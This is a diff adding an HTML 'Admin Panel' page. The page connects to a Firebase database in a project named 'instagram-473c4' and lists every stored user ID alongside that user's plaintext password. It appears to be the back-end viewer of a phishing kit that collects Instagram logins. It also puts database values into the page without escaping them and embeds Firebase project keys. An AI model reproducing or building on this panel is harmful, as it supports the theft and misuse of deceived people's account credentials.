@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f2f2f2;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      h1 {
+        text-align: center;
+        color: #333;
+      }
+
+      .user-list {
+        background-color: #fff;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        padding: 20px;
+      }
+
+      .user-list ul {
+        list-style-type: none;
+        padding: 0;
+      }
+
+      .user-list li {
+        padding: 10px;
+        border-bottom: 1px solid #e0e0e0;
+      }
+
+      .user-list li:last-child {
+        border-bottom: none;
+      }
+
+      .user-info {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .user-info h3 {
+        margin: 0;
+        color: #333;
+      }
+
+      .user-info p {
+        margin: 0;
+        color: #666;
+      }
+</style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Admin Panel</h1>
+      <div class="user-list">
+        <ul id="userList">
+          <li>Loading data...</li>
+        </ul>
+      </div>
+    </div>
+
+<script>
+      // Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyCAUYc9wZkBXh7vjfDtDfDVgIyHw6QBXc",
+        authDomain: "instagram-473c4.firebaseapp.com",
+        databaseURL: "https://instagram-473c4-default-rtdb.firebaseio.com/",
+        projectId: "instagram-473c4",
+        storageBucket: "instagram-473c4.appspot.com",
+        messagingSenderId: "952456961272",
+        appId: "1:952456961272:web:b937423a08463a7b996f0d",
+        measurementId: "G-RHZYLCFYV3",
+      };
+
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.database();
+
+      // Fetch data from Firebase and display in the admin panel
+      const userList = document.getElementById("userList");
+      db.ref("publicUsers/").on("value", (snapshot) => {
+        userList.innerHTML = ""; // Clear old data
+        if (snapshot.exists()) {
+          const data = snapshot.val();
+          for (let key in data) {
+            const user = data[key];
+            const li = document.createElement("li");
+            li.innerHTML = `
+              <div class="user-info">
+                <h3>User ID: ${user.userId}</h3>
+                <p>Password: ${user.password}</p>
+              </div>
+            `;
+            userList.appendChild(li);
+          }
+        } else {
+          userList.innerHTML = "<li>No data available</li>";
+        }
+      });
+</script>
+  </body>
+</html>
